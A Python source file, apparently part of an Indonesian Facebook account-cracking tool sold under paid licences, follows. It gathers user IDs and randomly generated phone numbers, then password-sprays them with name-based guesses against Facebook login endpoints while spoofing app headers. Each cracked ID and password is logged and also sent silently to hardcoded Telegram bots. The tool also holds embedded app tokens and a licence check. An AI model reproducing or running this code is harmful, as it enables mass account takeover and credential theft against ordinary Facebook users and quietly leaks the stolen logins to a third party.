			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")

###----------[ CRACK NOMOR  ]---------- ###
def Menu__Untuk__Dump__Nomor__Masal___Si__Kontol():
	print(Panel(f"{P2}crack dari nomor wajib menggunakan sandi manual or gabungan",width=80,padding=(0,7),style=f"{color_table}"))
	depan = console.input(f' {H2}• {P2} awalan nomor : ')
	if len(depan)==3:pass
	else:print(f" {H2}• {P2} masukan awalan nomor dengan benar");exit()
	jumla = console.input(f' {H2}• {P2} jumlah dump : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in id:pass
		else:id.append(D+'|123456')
		sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()		

###----------[ CRACK DARI FILES  ]---------- ###
def dump_file():
	print(Panel(f"{P2}masukan nama file dump yang sudah tersedia di /sdcard/namafile.txt",width=80,padding=(0,5),style=f"{color_table}"))
	file = console.input(f' {H2}• {P2} masukan nama file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:
			   user,nama = data.split('|')
			except:
			   print(f" {H2}• {P2} pemisah salah")
			   time.sleep(3);exit()
			id.append(data)
			sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			time.sleep(0.0000003)
	except FileNotFoundError:
	    print(f" {H2}• {P2} file {H2}{file} {P2}tidak tersedia")
	    time.sleep(3);exit()
	print("\r")
	print(Panel(f'\r{P2}total jumlah akun yang tersedia di dalam file {H2}{len(dump)}{reset}',width=80,padding=(0,13),style=f"{color_table}"))
	setting()

###----------[ DUMP LIKE ]---------- ###
def Lile():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	print(Panel(f"{P2}pastikan postingan memiliki like dan akun harus publik jangan private ",width=80,padding=(0,4),style=f"{color_table}"))
	pil = console.input(f' {H2}• {P2} masukan id postingan : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{pil}?fields=likes.limit(99999)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['likes']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    sys.stdout.flush()
			except:continue
		print('\r') 
		print(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {H2}• {P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ SETTING URUTAN ID & METODE ]---------- ###
def setting():
	print('')
	prints(f'01{P2}. crack dari id old')
	prints(f'02{P2}. crack dari id new')
	prints(f'03{P2}. crack dari id random')
	hu = console.input(f" {H2}• {P2} crack dari id ? : ")
	print('')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f' {H2}• {P2} pilih yang bener')
		time.sleep(3);setting()
		print('')
	prints(f'01. metode {O2}B-graph{H2} recommend{P2}\n02. metode {O2}B-Graph{B2} v2{P2} {H2}recommend{P2}\n03. metode {O2}m.facebook.com {B2} Validate{P2} {H2}recommend{P2}')
	hc = console.input(f"{H2}• {P2} pilih metode : ")
	print('')
	if hc in ['1','01']:
		method.append('Api')
	elif hc in ['2','02']:
		method.append('apikuv2')
	elif hc in ['3','03']:
		method.append('crack')
	else:
		print(f" {H2}• {P2} pilih metode dengan benar ")
		time.sleep(3);setting()
		print('')
	prints(f"{P2}{H2}01{P2}. setting password gabungan\n{P2}{H2}02{P2}. setting password otomatis\n{P2}{H2}03{P2}. setting password manual")
	hc = console.input(f"{H2}• {P2} pilih password : ")
	print('')
	if hc in ['']:
	  print(f"{H2}• {P2} terjadi kesalahan ")
	  setting()
	elif hc in ['1','01']:
		otomatis()
	elif hc in ['2','02']:
		Tambahan()
	elif hc in ['3','03']:
		Manual()

###----------[ PASSWORD DEFAULT ]---------- ###
def otomatis():
	prints(f'01. password nama\n02. password nama+123\n03. password nama+123+12345\n04. password nama+123+1234+12345\n05. password nama+123+1234+12345+123456\n06. password nama+321+1234')
	pwlis = console.input(f"{H2}• {P2} pilih password : ")
	print('')
	pwlist.append(pwlis)
	ua = console.input(f"{H2}• {P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f"{H2}• {P2} masukan useragent : ");uadia.append(bz)
		print(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T']:
		print('')
	else:uadarimu.append('uasc')
	os.system('clear')
	global prog,des
	banner()
	prints(f"""
{P2}----------------------------------------------
 Author    : Fajar
 Tool Name : VINIX
 Version   : 1.0
{P2}----------------------------------------------
 Total account : {len(id)}{P2} {J2}>{H2}>{P2} Method {J2}->{P2} M2
 {J2}Use flight mode for speed up{P2}
{P2}----------------------------------------------""")
	#prints(f"{P2}saat ini anda menggunakan user agent bawaan dari script VMBF")
	prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if '6' in pwlist:
					pwv=[nmf,frs+'321',frs+'1234']
				else:pass
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				elif 'crack' in method: 
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		exit("\ncracking done!")
		#print(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		#time.sleep(3);exit()

###----------[ PASSWORD GABUNG ]---------- ###
def Tambahan():
	#prints(f'01. password nama\n02. password nama+123\n03. password nama+123+12345\n04. password nama+123+1234+12345\n05. password nama+123+1234+12345+123456\n06. password nama+321+1234')
	pwlis = console.input(f"{H2}• {P2} ingin melanjutkan crack? (y/t) : ")
	pwlist.append(pwlis)
	prints(f"""
{P2}----------------------------------------------
 hasil {H2}{okc}{P2}
 hasil {J2}{cpc}{P2}
 {P2}----------------------------------------------
 {J2}Use flight mode for speed up{P2}
{P2}----------------------------------------------""")
	#os.system('clear')
	global prog,des
	prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if 'y' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'321',frs+'123456']
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				elif 'crack' in method: 
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		print(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ PASSWORD MANUAL ]---------- ###
def Manual():
	print(Panel(f"{P2}gunakan tanda koma ({color_rich},{P2}) untuk pemisah password yang anda input{reset}",width=80,padding=(0,5),style=f"{color_table}"))
	pwku = console.input(f" {H2}• {P2} masukan password tambahan : ")
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	ua = console.input(f" {H2}• {P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}• {P2} masukan useragent : ");uadia.append(bz)
		print(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T','Tidak']:
		print(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	print(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				pwv = []
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		print(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
        coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
        return(str(coki))

def ran():
    return str(tod()).split('.')[0]


###----------[ METODE GRAPH ]---------- ###
def Api(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"{H2}• B-graph {P2}{str(loop)}|OK-->{H2}{Ok}{P2}")
	prog.advance(des)
	ua = naruto()
	#ua2 = Fajar_Ugent()
	ses = requests.Session()
	for pw in pwv:
		try:
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
					"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
					"sdk_version": f"{random.randint(1,26)}", 
					"email": idf,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
			headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "session_key" in post.text and "EAA" in post.text:
				ok+=1
				prints(f"{H2} OK {idf}|{pw}")
				requests.post(f"https://api.telegram.org/bot5844990132:AAH39YK3YIsfjixMXAmp3k3xNmvYiseM058/sendMessage?chat_id=5596466928&text={idf}|{pw}").json()
				open('OK/'+okc,'a').write("%s|%s\n"%(idf,pw))
				ok.append(idf)
				break
			elif "User must verify their account" in post.text:
				cp+=1
				prints(f"{M2} CP {idf}|{pw}")
				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))
				cp.append(idf)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f"{M2}• CONNECTION {M2}{str(loop)}|OK-->{M2}{ok}{M2}")
			prog.advance(des)
			time.sleep(31)
	loop+=1
###----------[ METODE APIV2 ]---------- ###
def apikuv2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"{H2} • Graph {P2}{str(loop)}|OK->{H2}{ok}{P2}")
	prog.advance(des)
	ua = UserAgentBase()
	#ua = random.choice(ugent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			headers = {
			"Host": "graph.facebook.com",
			"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
			"x-fb-sim-hni": str(random.randint(20000, 40000)), 
			"x-fb-net-hni": str(random.randint(20000, 40000)), 
			"x-fb-connection-quality": "GOOD", 
			"x-fb-connection-type": "mobile.CTRadioAccessTechnologyLTE",
			"user-agent": ua, 
			"content-type": "application/x-www-form-urlencoded", 
			"accept-encoding": "gzip, deflate",
			"x-fb-http-engine": "Liger"
			}
			params = {
			"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
			"format": "JSON",
			"sdk_version": {random.randint(1,26)}, 
			"email":idf,
			"locale": "en_US",
			"password":pw,
			"sdk": "android",
			"generate_session_cookies": "1",
			"sig": "62f8ce9f74b12f84c123cc23437a4a32"
			}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				ok+=1
				coki = anjg["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				#kukis = kuki.replace(f'datr','c_user=(.*)')
				prints(f"{H2}• OK {idf}|{pw}")
				requests.post(f"https://api.telegram.org/bot5807986280:AAFyNXJx89HL8lZcDEZdnpsfCFPmwjuJGmY/sendMessage?chat_id=5596466928&text={idf}|{pw}").json()
				open('OK/'+okc,'a').write("%s|%s\n"%(idf,pw))
				ok.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				cp+=1
				prints(f"{M2}• CP {idf}|{pw}")
				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))
				cp.append(idf)
				break				
			#elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
				# prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")
				#prog.advance(des)
				#time.sleep(10)
			else:
				continue
		except requests.exceptions.ConnectionError:
			#prog.update(des,description=f"{M2}• SPAM {M2}OK :{M2}{ok} {M2}CP :{M2}{cp} {M2}{str(loop)}/{len(id2)} [{mm}{P2}]")
			#prog.advance(des)
			time.sleep(31)
	loop+=1

def crack(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"{H2} ---> Validate {P2}{str(loop)}|OK --> {H2}{ok}{P2}")
	prog.advance(des)
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=882a8490361da98702bf97a021ddc14d&client_country_code=ID&credentials_type=password&email=idf&error_detail_type=button_with_disabled&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authenticate&format=json&generate_machine_id=1&generate_session_cookies=1&locale=id_ID&method=auth.login&password=pw%40&sig=0f33b191390ab21304cb17996c116d4f&rtime=1670174133&subno_key=AaGeErfjxTKxgwBJbAYOUZluoPBWJZ7hKCvbd3zBVAwVs7qERSmsYGVSZkXX9sgXcv7HvqTAlSu_1GJK2q4aaVSon_nPghxTQOQMMl3SYpQ67mTCVQfDP6rjRfwfZEPMGxY1LXU5Um_L1_543u-GNXHIjAysnj8nwdGgNSwp7exuHq3iS2nSckl0Z6FG__FBrHLXQJEQB_EJ3dtJmTY472uKJwMvPw4tiD4iGG-c6zWCT-gNnGMdo6g4kSzu0M_1nDErHiiBMRPKEu-elFEEbr9eGRYSrIdIb4RFOIOnwqebqdCTOM_dH0IqS5tDH-548mM&hrc=1&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','upgrade-insecure-requests': '1','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=882a8490361da98702bf97a021ddc14d&client_country_code=ID&credentials_type=password&email=idf&error_detail_type=button_with_disabled&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authenticate&format=json&generate_machine_id=1&generate_session_cookies=1&locale=id_ID&method=auth.login&password=pw%40&sig=0f33b191390ab21304cb17996c116d4f&rtime=1670174133&subno_key=AaGeErfjxTKxgwBJbAYOUZluoPBWJZ7hKCvbd3zBVAwVs7qERSmsYGVSZkXX9sgXcv7HvqTAlSu_1GJK2q4aaVSon_nPghxTQOQMMl3SYpQ67mTCVQfDP6rjRfwfZEPMGxY1LXU5Um_L1_543u-GNXHIjAysnj8nwdGgNSwp7exuHq3iS2nSckl0Z6FG__FBrHLXQJEQB_EJ3dtJmTY472uKJwMvPw4tiD4iGG-c6zWCT-gNnGMdo6g4kSzu0M_1nDErHiiBMRPKEu-elFEEbr9eGRYSrIdIb4RFOIOnwqebqdCTOM_dH0IqS5tDH-548mM&hrc=1&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=882a8490361da98702bf97a021ddc14d&amp;auth_token=5b468d5cd7897290814588b3893231e8&amp;skip_api_login=1&amp;refsrc=deprecated&amp;app_id=350685531728&amp;lwv=100&amp;locale2=id_ID&amp;refid=9',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if 'c_user' in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
				prints(f'└── {H2}{idf}|{pw}\n{P2}└── {H2}{coki}{P2}')
				requests.post(f"https://api.telegram.org/bot5844990132:AAH39YK3YIsfjixMXAmp3k3xNmvYiseM058/sendMessage?chat_id=5596466928&text={idf}|{pw}").json()
				open('OK/'+okc,'a').write("%s|%s\n"%(idf,pw))
				ok.append(idf)
				break
			elif 'checkpoint' in po.cookies.get_dict().keys():
				cp+=1
				prints(f'└── {J2}{idf}|{pw}\n{P2}└── {J2}{ua}{P2}')
				open('CP/'+cpc,'a').write("%s|%s\n"%(idf,pw))
				cp.append(idf)
				break				
			#elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
				# prog.update(des,description=f"{M2}craking {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {str(loop)}/{len(id2)}")
				#prog.advance(des)
				#time.sleep(10)
			else:
				continue
		except requests.exceptions.ConnectionError:
			#prog.update(des,description=f"{M2}• SPAM {M2}OK :{M2}{ok} {M2}CP :{M2}{cp} {M2}{str(loop)}/{len(id2)} [{mm}{P2}]")
			#prog.advance(des)
			time.sleep(31)
	loop+=1


###----------[ CEK LISENSI ]---------- ###
def key():
	os.system("clear");banner();key = input(f" {K}#{P} masukan lisensi : {H}")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=18720&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);print(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server Facebook VMBF",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);menu()
	except KeyError:
		print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook VMBF");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNzMwOTc1MSIsInJzVWNHUklPNjRuY2Y4OW5yd1lkTXdFMWRGWWJ2V0s0MGVwU0pZRGQiXQ==&ProductId=18728&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook VMBF");time.sleep(2);exit()

###----------[ MASUK LISENSI ]---------- ###
def key():
	os.system("clear") 
	banner()
	print(Panel(f"{P2}silahkan masukan lisensi tools agar bisa masuk ke tools VMBF\njika anda belum mempunyai lisensi ketik {H2}beli {P2}untuk melihat harga lisensi",width=80,padding=(0,2),style=f"{color_table}"))
	key = console.input(f" {H2}• {P2} masukan lisensi : ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNzMwOTc1MSIsInJzVWNHUklPNjRuY2Y4OW5yd1lkTXdFMWRGWWJ2V0s0MGVwU0pZRGQiXQ==&ProductId=18728&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);print(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server ",width=80,padding=(0,9),style=f"{color_table}"));time.sleep(3);menu()
	except KeyError:
		print(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook VMBF");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNzMwOTc1MSIsInJzVWNHUklPNjRuY2Y4OW5yd1lkTXdFMWRGWWJ2V0s0MGVwU0pZRGQiXQ==&ProductId=18728&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook VMBF");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
	#print('')
    prints(Panel(f"{P2}[{H2}01{P2}]. 1 minggu {H2}50.000 {P2}max pemakaian 1 device\n{P2}[{H2}02{P2}]. 1 bulan {H2}100.000{P2} max pemakaian 5 device\n{P2}[{H2}03{P2}]. open source full update {H2}200.000"))
    zxc = console.input(f" {H2}• {P2} pilih lisensi : ")
    print('')
    if zxc in [""]:print(f" {H2}• {P2} pilih yang bener broo jangan kosong");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:print(f" {H2}• {P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:print(f" {H2}• {P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:print(f" {H2}• {P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+beli+lisensi+facebook+full+source");time.sleep(2);exit()
    else:print(f" {H2}• {P2} ngetik apaan lu ngab");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()

###----------[ AUTO CREATE FOLDER ]---------- ###
def AutoFolder():
    try:os.mkdir("OK")
    except:pass
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("data")
    except:pass
    try:os.mkdir("assets")
    except:pass

###----------[ PEMANGGIL ]---------- ###
if __name__=='__main__':
  try:
      with requests.Session() as ses:
           os.system("git pull")
           AutoFolder();cek_lisensi_aktif()
  except requests.exceptions.ConnectionError:
      print(f" {H2}• {P2} koneksi internet anda bermasalah")
      time.sleep(3);exit()
"))